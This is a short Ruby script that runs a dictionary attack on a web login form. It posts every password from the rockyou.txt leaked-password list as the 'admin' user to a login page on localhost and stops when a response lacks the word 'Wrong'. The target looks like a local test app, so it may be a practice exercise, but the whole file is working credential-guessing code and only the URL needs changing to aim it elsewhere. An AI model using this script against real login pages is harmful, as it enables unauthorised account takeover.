require 'net/http'
require 'uri'
                                              
def is_wrong_password? password
	uri = URI.parse 'http://localhost:4567/login'
	responce = Net::HTTP.post_form(uri, :username => 'admin',  :password => password).body
	responce.include? "Wrong"
end

input = File.open "rockyou.txt", "r"

while (line = input.gets)
	line.strip!
	print "trying password #{line}..."
	if is_wrong_password? line
		puts "Error"
	else
		puts "Found!"
		input.close
		exit
	end
end
